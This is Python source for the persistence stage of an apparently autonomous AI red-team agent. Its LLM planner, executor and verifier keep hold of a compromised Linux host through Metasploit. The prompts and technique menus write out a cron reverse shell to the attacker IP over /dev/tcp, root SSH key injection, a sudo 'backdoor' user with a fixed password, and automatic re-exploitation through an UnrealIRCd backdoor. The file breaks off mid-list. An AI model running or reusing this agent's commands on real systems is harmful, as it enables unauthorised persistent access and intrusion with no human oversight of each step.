"""
Persistence Subgraph — Install and verify a persistence mechanism on a compromised target.

Third stage of the killchain: recon → initial_access → **persistence** → privesc → impact.
Produces structured PersistenceFindings for downstream consumption.

Architecture:
    Planner ⟷ RAG → Executor ⟷ SSH/MSF → Verifier ⟷ SSH → Critic
                                                                 ↓
                                                          PASS → END
                                                          FAIL → Planner (max 5)

Usage:
    python stages/persistence.py                    # Interactive standalone mode
    python stages/persistence.py --graph            # Print graph topology
    from stages.persistence import run_persistence  # Programmatic subgraph call
"""

import sys
import json
import re
import time
import operator
from typing import TypedDict, Annotated, List, Literal

from langchain_core.messages import BaseMessage, HumanMessage, AIMessage, ToolMessage
from langchain_core.tools import tool
from langgraph.graph import StateGraph, END
from langgraph.prebuilt import ToolNode
from langgraph.checkpoint.memory import MemorySaver

from core_agents.common import (
    Colors, print_colored, call_llm, parse_json_response,
    run_ssh_command, KALI_IP, MODEL_NAME, FORBIDDEN_COMMANDS,
)
from core_agents.state import PersistenceFindings
from core_agents import mitre
from tools.rag import query_knowledge_base
from tools.metasploit_tools import msf_session, tool_list_sessions


def classify_technique(text: str) -> str:
    """Map free-form plan/technique text to a persistence technique slug.

    Slugs match the MITRE catalog (core_agents/mitre.py) so findings, the critic,
    the catalog menu, and the node's assigned technique all speak the same
    vocabulary. Returns "unknown" when nothing matches.
    """
    t = (text or "").lower()
    if "ssh" in t and "key" in t:
        return "ssh_key"
    if "web shell" in t or "webshell" in t or "/var/www" in t or "webroot" in t or "web root" in t:
        return "web_shell"
    if "ld_preload" in t or "ld.so.preload" in t or "dynamic linker" in t:
        return "ld_preload"
    if "rc.local" in t or "rc_local" in t or "init.d" in t or "update-rc.d" in t or "rc script" in t:
        return "rc_local"
    if "cron" in t:
        return "cron_job"
    if "atq" in t or "atd" in t or "at now" in t or "| at " in t or "at job" in t:
        return "at_job"
    if "systemd" in t or "service" in t:
        return "systemd_service"
    if "user" in t and ("account" in t or "useradd" in t):
        return "user_account"
    if "bashrc" in t or "profile" in t:
        return "shell_profile"
    return "unknown"

# =============================================================================
# CONSTANTS
# =============================================================================

MAX_PERSISTENCE_RETRIES = 5
MAX_PLANNER_TOOL_CALLS = 3
MAX_EXECUTOR_TOOL_CALLS = 10
MAX_VERIFIER_TOOL_CALLS = 5

# =============================================================================
# STATE
# =============================================================================

class PersistenceState(TypedDict):
    messages: Annotated[List[BaseMessage], operator.add]
    target_ip: str
    session_id: str
    session_type: str          # "command_shell" | "meterpreter"
    access_level: str          # "user" | "root"
    objective: str
    assigned_technique: str    # MITRE technique slug the node assigned (e.g. "cron_job");
                               # "" = unassigned (legacy self-select behavior)
    assigned_technique_id: str # ATT&CK id of the assigned technique (e.g. "T1053.003")
    persistence_plan: str      # Planner's chosen technique + steps
    install_result: str        # Executor's summary of what was installed
    verification_result: str   # Verifier's summary of verification test
    loop_step: int
    critic_verdict: str        # "PASS" | "FAIL"

# =============================================================================
# TOOL DEFINITIONS
# =============================================================================

@tool
def tool_linux_terminal(command: str):
    """
    Execute a shell command on the KALI ATTACKER machine via SSH.
    This runs on Kali — NOT on the target. Use ONLY for Kali-side tasks:
    - ssh-keygen, starting listeners, SSH login tests, receiving files.

    To run commands on the TARGET, use tool_session_command instead.

    NON-INTERACTIVE ONLY. No ftp, ssh, vi, nano, top.
    Use non-interactive flags (e.g., -y).
    """
    if any(bad in command for bad in FORBIDDEN_COMMANDS):
        return "Command blocked by safety guardrails."
    print_colored(f"\n[Persistence Terminal] Executing: {command}", Colors.OKCYAN)
    return run_ssh_command(command)


@tool
def tool_session_command(session_id: str, command: str):
    """Execute a command ON THE TARGET through an active Metasploit session.

    This runs directly on the compromised target machine — NOT on Kali.
    Uses the MSF session API (session.shell_write/read) for reliable, atomic command execution.

    Use for: whoami, id, crontab -l, cat /etc/passwd, mkdir, echo, chmod, etc.

    Persistence-stage commands (useradd, crontab pipes, etc.) can be slow to
    flush on a raw command_shell, so this wrapper uses a longer 30s read window
    than the default 10s to avoid mistaking slow output for an unresponsive shell.

    Args:
        session_id: The MSF session ID (e.g., "3")
        command: The command to run on the target
    """
    return msf_session.run_session_command(session_id, command, timeout=30)


@tool
def tool_metasploit_rpc(command: str):
    """
    Execute a command on the Metasploit CONSOLE.
    Use ONLY for MSF console commands: listing sessions, background, use, set, run, exploit.

    Do NOT use this for running commands on the target — use tool_session_command instead.

    NOTE: this call has a 45-second wall-clock timeout. Meterpreter post modules
    (run persistence, use post/..., run) MAY block the console until the module
    completes or times out — do NOT chain multiple blocking run commands.
    """
    try:
        return msf_session.send_command(command, timeout=45)
    except Exception as e:
        return f"RPC Error: {str(e)}"


# Tool sets
PLANNER_TOOLS = [query_knowledge_base]
EXECUTOR_TOOLS = [tool_linux_terminal, tool_metasploit_rpc, tool_session_command, tool_list_sessions]
VERIFIER_TOOLS = [tool_linux_terminal, tool_metasploit_rpc, tool_session_command, tool_list_sessions]

# =============================================================================
# SYSTEM PROMPTS
# =============================================================================

PLANNER_PROMPT = f"""You are a Persistence Planner for a Red Team agent. Your attacker IP is {KALI_IP}.

You receive:
1. TARGET IP, SESSION ID, SESSION TYPE, ACCESS LEVEL — details of the active session
2. OBJECTIVE — the operator's overall goal
3. RECOMMENDED TECHNIQUES — pre-verified techniques for the current access level and session type
4. CRITIC FEEDBACK — if retrying, what went wrong last time

Your job: choose ONE persistence technique and produce a step-by-step installation plan.

**TOOL CLARITY — 3 tools, 3 different targets:**
- `tool_session_command(session_id, command)` → runs ON THE TARGET (use for all target commands: whoami, crontab, echo, mkdir, chmod, etc.)
- `tool_linux_terminal(command)` → runs ON KALI only (ssh-keygen, starting listeners, SSH login tests)
- `tool_metasploit_rpc(command)` → MSF console only (listing sessions, background, use, set, run)

**TECHNIQUE SELECTION:**
PRIORITIZE the RECOMMENDED TECHNIQUES provided in the context — these are pre-verified and reliable.
Only query the knowledge base if ALL recommended techniques have already failed or if you need
a novel technique not in the list.

**SSH KEY INJECTION PRECONDITION:** Only select SSH authorized_keys injection if the recon data,
the KNOWN OPEN PORTS line, or the objective text confirms port 22/SSH is open on the target. The
session may have been obtained via a NON-SSH vector (e.g., an IRC or web backdoor) on a host with
no SSH daemon — injecting a key there silently fails and the verifier's SSH login test will burn
all its slots. If SSH status is unknown or port 22 is NOT confirmed open, prefer the cron job as
the first attempt.

**You have access to `query_knowledge_base`** — a RAG tool for searching post-exploitation techniques.
Use it as a FALLBACK only (max {MAX_PLANNER_TOOL_CALLS} queries). Focus queries on specific novel
techniques, NOT generic "persistence" searches.

**SESSION TYPE AWARENESS:**
- **command_shell**: Raw shell only. All persistence must use standard Linux commands (echo, crontab, mkdir, chmod, etc.). No MSF post modules, no `upload`, no `run persistence`.
- **meterpreter**: Full MSF post-exploitation available. Can use `upload`, `run`, post modules.

**Output format (final answer — no more tool calls):**

PERSISTENCE PLAN:
TECHNIQUE: <method name, e.g., "cron_job">
ACCESS_LEVEL: <current access level>
SESSION_TYPE: <command_shell or meterpreter>
STEPS:
1. <exact command or action, specifying which tool to use>
2. <exact command or action>
...

VERIFICATION_PLAN:
YOU own the verification. Emit the EXACT command(s) the verifier will run to prove
this mechanism is not just installed but actually RUNNING/reachable, plus the exact
output that confirms it. Do not hand-wave ("check it works") — hand over runnable
proof. For each check give: the tool, the command, and the expected output token.
  CMD_1: <tool_session_command|tool_linux_terminal>("<exact command>")
  EXPECT_1: <the exact string/pattern in the output that proves EXECUTION>
  CMD_2: ...   (optional second confirmation)
  EXPECT_2: ...
Proof-of-execution examples (installation alone is NOT proof):
  - cron: install a 1-min heartbeat writing an epoch to /tmp/.hb, wait for the next
    minute with tool_linux_terminal("sleep 70") (a KALI-side wait — NEVER a
    session-side sleep), then tool_session_command(<id>,"cat /tmp/.hb") EXPECT: a
    timestamp line (the daemon fired the job). A `crontab -l` listing alone does NOT count.
  - ssh key / new user: tool_linux_terminal("ssh -i <key> <user>@<target> id")
    EXPECT: uid=... returned with no password prompt.
  - service: tool_session_command(<id>,"systemctl is-active <svc>") EXPECT: active.
  - callback shell: tool_linux_terminal("timeout 75 nc -lvnp 4444") EXPECT: a
    connection line from <target>. A one-off inbound connection from the target IS
    valid proof — you do not need a full interactive shell.

**On retry:**
- Read the critic's feedback carefully
- Choose a DIFFERENT technique from the recommended list
- Do NOT repeat a technique that already failed
- Each PREVIOUS ATTEMPTS entry identifies the FAILED_TECHNIQUE that was tried.
  You MUST choose a different technique from the recommended list for this retry.
  Do NOT select the same technique as any FAILED_TECHNIQUE line above, even with
  different parameters (e.g. if cron_job failed, switch to SSH key injection or a
  new user account — do not just tweak the cron command).
"""

EXECUTOR_PROMPT = f"""You are a Persistence Executor for a Red Team agent. Your attacker IP is {KALI_IP}.

You have 3 tools — each runs in a DIFFERENT place:

**TOOL CLARITY:**
- `tool_session_command(session_id, command)` → runs ON THE TARGET (use for ALL target commands)
- `tool_linux_terminal(command)` → runs ON KALI only (ssh-keygen, listeners, SSH login tests)
- `tool_metasploit_rpc(command)` → MSF console only (listing sessions, background, etc. — NOT for target commands)

**CRITICAL:** To run commands on the target, ALWAYS use `tool_session_command`. This is reliable and atomic.
Do NOT use `tool_metasploit_rpc` for target commands — it goes through the MSF console which is unreliable.
Do NOT use `tool_linux_terminal` for target commands — that runs on Kali, not the target.

**DEAD SESSION DETECTION & RECOVERY:** If `tool_session_command` returns "Error: Session <id> not found",
the session has died (the IRC/web backdoor sessions handed to this stage are inherently unstable and
may die MID-installation, e.g. between `whoami` and the crontab install). Immediately call
`tool_list_sessions()` to list active sessions (use this, NOT tool_metasploit_rpc("sessions") —
the console call can wedge into interactive mode and return garbage "received: 0" noise).
- If an active session to the target exists, switch to its ID and CONTINUE the persistence
  installation from the beginning with that session ID (re-run the install steps — a half-installed
  mechanism on a dead session is not persistent).
- If NO active session exists at all, attempt ONE re-establishment of a session, because the
  known-working initial vector for these targets is the UnrealIRCd backdoor on port 6667. Run, in
  order:
    1. tool_metasploit_rpc("use exploit/unix/irc/unreal_ircd_3281_backdoor")
    2. tool_metasploit_rpc("set RHOSTS <target_ip>")
    3. tool_metasploit_rpc("set LHOST {KALI_IP}")
    4. tool_metasploit_rpc("set LPORT 4445")
    5. tool_metasploit_rpc("run")
  Then call tool_list_sessions(); if a NEW session opened, switch to its ID and
  install the persistence mechanism from the beginning with the new session ID.
- ONLY if re-exploitation ALSO fails (no new session) do you STOP making tool calls and state
  clearly in your summary that the session was dead and could not be re-established — do NOT
  attempt any further persistence commands.
Do NOT retry the ORIGINAL session_id after seeing the not-found error (retrying only burns budget).

**UNRESPONSIVE SHELL DETECTION:** Some commands ALWAYS produce output when the shell is functional: `whoami`, `id`, `crontab -l`, `cat <file>`. If `tool_session_command` returns `(no output)` for any such diagnostic command, the shell is frozen or not accepting input — treat this as an unresponsive session. This is a DIFFERENT failure mode from "Error: Session X not found". Immediately call `tool_list_sessions()` to confirm the session is still listed. If it is, try ONE recovery: call `tool_session_command` with a simple newline or `echo test`. If still `(no output)`, STOP making tool calls and state clearly: 'Session unresponsive — no output from diagnostic command. Cannot confirm persistence was installed.' Do NOT claim success from silent output on a diagnostic command — `(no output)` is NOT evidence of success.

- **NEVER use `sudo` through a session** — if you have root access, you already ARE root. If you don't, sudo won't work (no TTY).

**SESSION TYPE AWARENESS:**
- **command_shell**: Raw shell. Use standard Linux commands only. No `upload`, no `run`, no post modules.
- **meterpreter**: Full MSF post-exploitation. Can use `upload`, `run persistence`, post modules, etc.
- Match your commands to the session type. Do NOT try meterpreter commands on a command_shell.

**MSF CONSOLE TIMEOUT:** tool_metasploit_rpc has a 45-second wall-clock timeout. For meterpreter post modules (run persistence, use post/..., run), the MSF console MAY block until the module completes or times out — do NOT chain multiple blocking run commands back-to-back. After calling run on a post module, wait for the tool output before calling the next command. If the output says the module is still running or is empty, do not call run again; move on and let the verifier confirm the result.

**Your job:** Execute the persistence installation plan step by step.

**Rules:**
1. Execute commands ONE AT A TIME via tools
2. READ each output carefully before proceeding
3. If a command fails, adapt (e.g., create directories, fix permissions)
4. Do NOT run more than {MAX_EXECUTOR_TOOL_CALLS} commands total
5. Do NOT try to create objective files (like i_got_in.txt) — that is the Impact stage's job. Focus ONLY on persistence.
6. Do NOT use `crontab -e` (interactive). Use `echo '...' | crontab -` instead.
7. NEVER wait via a session command: `tool_session_command(<id>, "sleep N")` — or any
   blocking command (`tail -f`, `nc -l` without `timeout`, `ping` without `-c`) — FREEZES
   the single-threaded reverse_perl shell, and every later read then returns "(no output)".
   To wait for a cron to fire, wait on KALI with `tool_linux_terminal("sleep 70")`, THEN
   read the artifact on target with `tool_session_command(<id>, "cat /tmp/.hb")`.

**Step-by-step example for cron job persistence (session 3):**

1. tool_session_command("3", "whoami")                          ← confirm access level ON TARGET
2. tool_session_command("3", "echo \\"* * * * * /bin/bash -c 'bash -i >& /dev/tcp/{KALI_IP}/4444 0>&1'\\" | crontab -")
3. tool_session_command("3", "crontab -l")                      ← verify cron is set ON TARGET

**Cron reverse-shell note:** the cron entry will try to connect back to
{KALI_IP}:4444 every minute. If you want to CONFIRM it actually fires (not just
that it is listed), start a background listener on Kali first so the connection
is not refused: tool_linux_terminal("nohup nc -lvnp 4444 >/tmp/persist_listener.log 2>&1 &").
Otherwise, verification will rely on confirming the entry is listed, the cron
daemon is running, and the shell binary exists.

**Cron heartbeat (install ALONGSIDE the reverse shell):** If cron is your chosen
technique, ALSO install a file-write heartbeat cron in the SAME crontab. This
proves the cron daemon actually fires every minute even if /dev/tcp is blocked
on the target (some hardened kernels disable it), giving the verifier a
ground-truth artifact instead of a silent reverse shell. Install BOTH lines at
once so you do not clobber the reverse-shell entry:
  tool_session_command("3", "(crontab -l 2>/dev/null; echo \\"* * * * * /bin/sh -c 'date >> /tmp/.hb'\\") | crontab -")
Then confirm with tool_session_command("3", "crontab -l"). The verifier will
later cat /tmp/.hb to prove execution. To wait for the cron to fire, use
tool_linux_terminal("sleep 70") on KALI — NEVER tool_session_command(<id>,"sleep ..."):
the reverse_perl command_shell is single-threaded, so a session-side sleep freezes it
and every later read returns "(no output)".

**Step-by-step example for SSH key injection (session 3):**

1. tool_linux_terminal("ssh-keygen -t rsa -f /tmp/persist_key -N \\"\\"")   ← generate key on KALI
2. tool_linux_terminal("cat /tmp/persist_key.pub")                           ← read public key on KALI
3. tool_session_command("3", "mkdir -p ~/.ssh && chmod 700 ~/.ssh")          ← create dir ON TARGET
4. tool_session_command("3", "echo '<pubkey contents>' >> ~/.ssh/authorized_keys")  ← inject key ON TARGET
5. tool_session_command("3", "chmod 600 ~/.ssh/authorized_keys")             ← set perms ON TARGET

**IMPORTANT for SSH key injection:** `<pubkey contents>` / `<PUBKEY>` is a PLACEHOLDER.
You MUST copy the ACTUAL public key text returned by `cat /tmp/persist_key.pub` (step 2)
and paste it verbatim into the echo command in step 4. Do NOT echo the literal string
`<PUBKEY>` or invent a fake key — a non-RSA value makes the SSH login verification fail.

**When done, provide a text summary of what was installed and where.**
Do not make any more tool calls after providing your summary.
"""

VERIFIER_PROMPT = f"""You are a Persistence Verifier for a Red Team agent. Your attacker IP is {KALI_IP}.

You have 3 tools:
- `tool_session_command(session_id, command)` — run commands ON THE TARGET (crontab -l, systemctl, grep, etc.)
- `tool_linux_terminal(command)` — run commands on KALI (SSH login tests, checking listeners)
- `tool_metasploit_rpc(command)` — MSF console only (listing sessions, etc.)

**Your job:** Verify that the installed persistence mechanism actually works.

**HONOR THE PLAN'S VERIFICATION_PLAN FIRST.** The planner that chose this technique
also handed you a VERIFICATION_PLAN with concrete CMD_/EXPECT_ pairs — those are the
agent's own proof-of-execution test and they are your PRIMARY criterion. Run those
exact commands and compare against the stated EXPECT tokens:
  - Every CMD matches its EXPECT  → STATUS: WORKING (the plan's own bar is met).
  - The plan's checks run but miss their EXPECT → STATUS: PARTIAL, quote the actual
    output so the critic and next attempt see what fell short.
The per-technique strategies below are FALLBACK guidance for when the plan gives no
usable command, or a sanity cross-check — not a second, stricter gate you impose on
top of a plan that already passed. Do NOT invent a harsher bar than the plan asked
for. The ONE rule you may never relax: proof must show the mechanism EXECUTING
(a job fired, a login succeeded, a callback arrived) — a mere install listing
(crontab -l, a passwd line, a copied key) is never WORKING on its own.

**CRITICAL — WHERE TO RUN VERIFICATION:**
- To check things ON THE TARGET (crontab -l, systemctl, /etc/passwd), use `tool_session_command`.
- To check things FROM KALI (SSH login test, listener check), use `tool_linux_terminal`.
- Do NOT use `tool_metasploit_rpc` for running commands on the target.

**DEAD SESSION DETECTION:** If `tool_session_command` returns "Error: Session <id> not found",
the session has died. Immediately call `tool_list_sessions()` to list active sessions (use this,
NOT tool_metasploit_rpc("sessions") — the console call can wedge and return "received: 0" garbage).
If an active session to the target exists, switch to its ID for the remaining verification commands.
If no active session exists at all, STOP making tool calls and report STATUS: NOT WORKING with
EVIDENCE noting the session was dead — do NOT retry the original session_id.

**UNRESPONSIVE SHELL DETECTION:** Some commands ALWAYS produce output when the shell is functional: `whoami`, `id`, `crontab -l`, `cat <file>`. If `tool_session_command` returns `(no output)` for any such diagnostic command, the shell is frozen or not accepting input — treat this as an unresponsive session (DIFFERENT from "Session X not found"). Immediately call `tool_list_sessions()` to confirm the session is still listed. If it is, try ONE recovery: call `tool_session_command` with `echo test`. If still `(no output)`, STOP making tool calls and report STATUS: NOT WORKING with EVIDENCE noting the session was unresponsive. Do NOT report STATUS: WORKING when a diagnostic command returned `(no output)` — silent output is NOT proof the mechanism works. BUT: a single `(no output)` on a flaky command_shell is often just a slow flush, not death — re-issue the SAME read once or twice before concluding unresponsive, and if a LATER read of the SAME artifact (e.g. cat /tmp/.hb) DOES return content, that content is authoritative regardless of the earlier empty read.

**Verification strategies by technique:**

SSH Key:
- FROM KALI: `tool_linux_terminal("ssh -i /tmp/persist_key -o StrictHostKeyChecking=no <user>@<target> whoami")`
- Expected: returns the username without password prompt

Cron Job:
- A `crontab -l` listing alone is NOT sufficient — an entry that references a
  missing shell, a wrong path, or runs while the cron daemon is stopped will
  silently fail every minute. Confirm ALL THREE of the following:
  1. ON TARGET: `tool_session_command("<session_id>", "crontab -l")`
     Expected: the reverse-shell cron entry is listed.
  2. ON TARGET: `tool_session_command("<session_id>", "service cron status || systemctl is-active cron || systemctl is-active crond")`
     Expected: cron daemon is running/active.
  3. ON TARGET: `tool_session_command("<session_id>", "which bash")`
     Expected: the shell binary referenced by the entry exists (e.g. /bin/bash).
  4. ON TARGET: `tool_session_command("<session_id>", "bash -c 'echo x >/dev/tcp/127.0.0.1/22' 2>/dev/null && echo dev_tcp_ok || echo no_dev_tcp")`
     Expected: `dev_tcp_ok` (bash can open /dev/tcp). Do NOT use `ls -la /dev/tcp`
     — /dev/tcp is a bash pseudo-device with no filesystem directory entry, so
     `ls` reports "No such file or directory" even when the redirection works
     perfectly, producing a false PARTIAL. The bash test above actually exercises
     the pseudo-device. If the output is `no_dev_tcp`, the `/dev/tcp` redirection
     the reverse shell relies on is unavailable on this target — the cron job is
     listed but the reverse shell will NOT fire. In that case set STATUS to
     PARTIAL (not WORKING) and note it in EVIDENCE so the critic knows a
     file-write heartbeat fallback is needed.
  5. HEARTBEAT / CALLBACK CONFIRMATION (REQUIRED for STATUS: WORKING). A listed
     entry + live daemon + /dev/tcp is NOT proof the reverse shell actually
     connects back. Confirm execution with EITHER:
       (a) PREFERRED — a file-write heartbeat cron (writing to /tmp/.hb): wait for
           the cron to fire with `tool_linux_terminal("sleep 70")` on KALI (NEVER a
           session-side sleep — it freezes the single-threaded shell), then ON TARGET:
           `tool_session_command("<session_id>", "cat /tmp/.hb")`.
           If it returns a timestamp/date line, the cron daemon is PROVEN to fire
           jobs — this ALONE satisfies WORKING (whether the cron used `>` or `>>`,
           i.e. whether or not the file "grew"). This is the most reliable proof, so
           prefer it over a reverse-shell callback. If the first cat returns
           `(no output)`, the flaky shell just hasn't flushed — re-issue the SAME
           cat once or twice; a dated line on ANY of those reads is conclusive
           WORKING. Do NOT let an unrelated nc-callback timeout, a console
           "received: 0" line, or an earlier empty read downgrade a /tmp/.hb you
           DID read with a timestamp.
       (b) If no heartbeat exists, start a Kali listener and wait for the
           reverse shell to call back:
           `tool_linux_terminal("timeout 75 nc -lvnp 4444")`.
           If a connection from the target arrives within 75s — WORKING.
     If NEITHER a grown heartbeat nor a callback is confirmed, the mechanism is
     unproven: STATUS must be PARTIAL (not WORKING).
- If the cron entry is a reverse shell, you cannot claim it fires without a
  confirmed callback or heartbeat. Treat it as WORKING only when checks 1-4 pass
  AND check 5 confirms actual execution (grown /tmp/.hb OR a listener callback).
  If checks 1-4 pass but check 5 cannot confirm execution, report PARTIAL and
  note that a file-write heartbeat cron is the recommended fallback.

Systemd Service:
- ON TARGET: `tool_session_command("<session_id>", "systemctl is-enabled <service>")`
- Expected: "enabled"

User Account:
- FROM KALI: `tool_linux_terminal("sshpass -p '<pass>' ssh -o StrictHostKeyChecking=no <user>@<target> whoami")`
- Or ON TARGET: `tool_session_command("<session_id>", "grep <user> /etc/passwd")`

**Rules:**
1. Run verification commands ONE AT A TIME
2. Do NOT run more than {MAX_VERIFIER_TOOL_CALLS} commands
3. Provide a text summary with clear PASS/FAIL assessment

**Output (final text — no more tool calls):**

VERIFICATION RESULT:
METHOD: <technique verified>
STATUS: <WORKING | PARTIAL | NOT WORKING>
EVIDENCE: <what output confirmed it. For PARTIAL, state exactly which check
          failed (e.g. /dev/tcp unavailable so the cron reverse shell will not
          fire) and what fallback would make it WORKING (e.g. file-write heartbeat).>
"""

CRITIC_PROMPT = f"""You are a Persistence Critic for a Red Team operation. Your IP is {KALI_IP}.

You evaluate whether a persistence mechanism was successfully installed AND verified.

**You receive:**
- The persistence plan (technique chosen)
- The executor's installation summary
- The verifier's test results
- The loop step count

**Evaluation criteria:**

1. **Mechanism installed?** — Did the executor report successful installation?
2. **Mechanism verified?** — Did the verifier confirm the mechanism works?
   - SSH key: verified login works without password
   - Cron: verified job is listed and/or fires
   - Service: verified service is active/enabled
   - User: verified new user can log in
3. **Both required for PASS** — installation without verification is NOT a PASS

**Verdict:**
- **PASS** if: mechanism was installed AND verified working (verifier STATUS: WORKING)
- **FAIL** if: installation failed, OR verification failed/not performed, OR the
  verifier reported STATUS: PARTIAL (e.g. cron listed but /dev/tcp unavailable so
  the reverse shell will not fire). On a PARTIAL, give FEEDBACK telling the next
  attempt to use the file-write heartbeat fallback or a different technique.

**Output format:**

VERDICT: <PASS|FAIL>

METHOD: <technique that was attempted>

ASSESSMENT: <2-3 sentence summary>

FEEDBACK: <if FAIL — specific instructions for retry.
           Suggest a DIFFERENT technique if the current one keeps failing.
           Be specific: name the technique and key commands.>
"""

# =============================================================================
# MESSAGE HELPERS
# =============================================================================

def _sanitize_message_window(messages: list) -> list:
    """Ensure message ordering is valid for the OpenAI API.

    Handles two failure modes:
    1. Orphaned ToolMessage — no preceding AIMessage with tool_calls → drop it
    2. AIMessage with tool_calls but missing ToolMessage responses → add dummy responses

    Both cause OpenAI 400 errors and crash the subgraph.
    """
    sanitized = []
    i = 0
    while i < len(messages):
        msg = messages[i]
        if isinstance(msg, AIMessage) and getattr(msg, 'tool_calls', None):
            # AI message with tool_calls: collect all following ToolMessages
            sanitized.append(msg)
            expected_ids = {tc['id'] for tc in msg.tool_calls}
            found_ids = set()
            j = i + 1
            while j < len(messages) and isinstance(messages[j], ToolMessage):
                if messages[j].tool_call_id in expected_ids:
                    sanitized.append(messages[j])
                    found_ids.add(messages[j].tool_call_id)
                j += 1
            # Add dummy responses for any missing tool_call_ids
            for missing_id in expected_ids - found_ids:
                sanitized.append(ToolMessage(
                    content="[No output captured]",
                    tool_call_id=missing_id,
                ))
            i = j
        elif isinstance(msg, ToolMessage):
            # Orphaned ToolMessage (no preceding AI with tool_calls) — skip
            i += 1
        else:
            sanitized.append(msg)
            i += 1
    return sanitized

def _extract_open_ports(text: str) -> str:
    """Best-effort extraction of open-port hints from recon/objective text.

    Looks for explicit 'open' port mentions and bare port numbers next to
    common service names so the planner can filter SSH-key injection when
    port 22 is not confirmed open. Returns a short comma-joined string or "".
    """
    if not text:
        return ""
    ports = set()
    # Patterns like "22/tcp open", "port 22", "22 (ssh)", "ssh on 22"
    for m in re.finditer(r"(\d{1,5})\s*/\s*tcp\s+open", text, re.IGNORECASE):
        ports.add(m.group(1))
    for m in re.finditer(r"\bport\s+(\d{1,5})\b", text, re.IGNORECASE):
        ports.add(m.group(1))
    # Service-name hints map to their canonical port.
    service_ports = {"ssh": "22", "http": "80", "https": "443", "ftp": "21", "irc": "6667"}
    low = text.lower()
    for svc, port in service_ports.items():
        if svc in low:
            ports.add(port)
    if not ports:
        return ""
    # Sort numerically for readability.
    return ", ".join(sorted(ports, key=lambda p: int(p)))


def _get_recommended_techniques(access_level: str, session_type: str, session_id: str,
                                only_slug: str = "") -> str:
    """Return deterministic persistence technique recommendations based on context.

    These are pre-verified, reliable techniques that the planner should try BEFORE
    falling back to RAG. Keeps RAG available for novel techniques when these are exhausted.

    When `only_slug` is set (the node assigned a MITRE technique), the menu is
    filtered to that ONE technique's procedures — the subagent executes procedures
    under the assigned technique and never sees the others to switch to. If no
    pre-built procedure exists for the assigned slug (e.g. systemd on an init-based
    target), the catalog's procedure_hint is surfaced and the planner is told to
    use the knowledge base for procedures under that technique.
    """
    techniques = []

    # 'unknown' and sudo-capable users are root-equivalent for technique selection.
    # Falling into the user branch would deny them root-appropriate techniques
    # (e.g. writing to /root/.ssh or /etc/init.d) even when they could use them.
    if access_level in ("root", "unknown", "user_with_sudo"):
        techniques.append({
            "name": "Cron job backdoor",
            "reliability": "HIGH",
            "session_types": ["command_shell", "meterpreter"],
            "steps": [
                f'tool_session_command({session_id}, "whoami")  # confirm root access on TARGET',
                f'tool_session_command({session_id}, "echo \\"* * * * * /bin/bash -c \'bash -i >& /dev/tcp/{KALI_IP}/4444 0>&1\'\\" | crontab -")',
                f'tool_session_command({session_id}, "crontab -l")  # verify on TARGET',
            ],
            "verification": "tool_session_command: crontab -l shows the reverse shell entry; bash -c 'echo x >/dev/tcp/127.0.0.1/22' (echoes dev_tcp_ok) confirms the reverse shell can fire. Do NOT use 'ls -la /dev/tcp' — it always fails on Linux even when /dev/tcp works.",
            "notes": ("Most reliable. Works on all Linux. Fires every minute. The entry "
                      "explicitly invokes /bin/bash so /dev/tcp works even if cron uses /bin/sh. "
                      "If /dev/tcp is unavailable (some hardened kernels/distros), the reverse "
                      "shell will NOT fire — fall back to a file-write heartbeat to prove the "
                      "cron executes: append "
                      "'* * * * * /bin/sh -c \"date >> /tmp/.hb\"' and verify /tmp/.hb grows."),
        })
        techniques.append({
            "name": "SSH authorized_keys injection",
            "reliability": "HIGH",
            "session_types": ["command_shell", "meterpreter"],
            "steps": [
                'tool_linux_terminal: ssh-keygen -t rsa -f /tmp/persist_key -N ""   # on KALI',
                "tool_linux_terminal: cat /tmp/persist_key.pub   # on KALI",
                f'tool_session_command({session_id}, "mkdir -p /root/.ssh && chmod 700 /root/.ssh")  # on TARGET',
                f'tool_session_command({session_id}, "echo \'<PUBKEY>\' >> /root/.ssh/authorized_keys")  # on TARGET',
                f'tool_session_command({session_id}, "chmod 600 /root/.ssh/authorized_keys")  # on TARGET',
            ],
            "verification": "tool_linux_terminal: ssh -i /tmp/persist_key -o StrictHostKeyChecking=no root@<target> whoami",
            "notes": ("Reliable. Requires SSH service on target (port 22). "
                      "IMPORTANT: <PUBKEY> is a PLACEHOLDER — you MUST replace it with the "
                      "actual public key text printed by `cat /tmp/persist_key.pub` (step 2). "
                      "Do NOT inject the literal string <PUBKEY> or a made-up key — a "
                      "non-RSA value will make the SSH login verification fail."),
        })
        techniques.append({
            "name": "New user account with SSH",
            "reliability": "MEDIUM",
            "session_types": ["command_shell", "meterpreter"],
            "steps": [
                f'tool_session_command({session_id}, "useradd -m -s /bin/bash -G sudo backdoor")  # on TARGET',
                f'tool_session_command({session_id}, "echo \'backdoor:backdoor123\' | chpasswd")  # on TARGET',
            ],
            "verification": "tool_linux_terminal: sshpass -p 'backdoor123' ssh -o StrictHostKeyChecking=no backdoor@<target> whoami",
            "notes": "Creates a new login. Visible in /etc/passwd — less stealthy.",
        })
    else:
        # user-level access
        techniques.append({
            "name": "User cron job backdoor",
            "reliability": "HIGH",
            "session_types": ["command_shell", "meterpreter"],
            "steps": [
                f'tool_session_command({session_id}, "whoami")  # confirm user on TARGET',
                f'tool_session_command({session_id}, "echo \\"* * * * * /bin/bash -c \'bash -i >& /dev/tcp/{KALI_IP}/4444 0>&1\'\\" | crontab -")',
                f'tool_session_command({session_id}, "crontab -l")  # verify on TARGET',
            ],
            "verification": "tool_session_command: crontab -l shows the reverse shell entry; bash -c 'echo x >/dev/tcp/127.0.0.1/22' (echoes dev_tcp_ok) confirms the reverse shell can fire. Do NOT use 'ls -la /dev/tcp' — it always fails on Linux even when /dev/tcp works.",
            "notes": ("Works without root. User-level cron. The entry explicitly invokes "
                      "/bin/bash so /dev/tcp works even if cron uses /bin/sh. If /dev/tcp is "
                      "unavailable, the reverse shell will NOT fire — fall back to a file-write "
                      "heartbeat (e.g. '* * * * * /bin/sh -c \"date >> /tmp/.hb\"') to prove the "
                      "cron executes."),
        })
        techniques.append({
            "name": "SSH authorized_keys injection (user)",
            "reliability": "HIGH",
            "session_types": ["command_shell", "meterpreter"],
            "steps": [
                'tool_linux_terminal: ssh-keygen -t rsa -f /tmp/persist_key -N ""   # on KALI',
                "tool_linux_terminal: cat /tmp/persist_key.pub   # on KALI",
                f'tool_session_command({session_id}, "mkdir -p ~/.ssh && chmod 700 ~/.ssh")  # on TARGET',
                f'tool_session_command({session_id}, "echo \'<PUBKEY>\' >> ~/.ssh/authorized_keys")  # on TARGET',
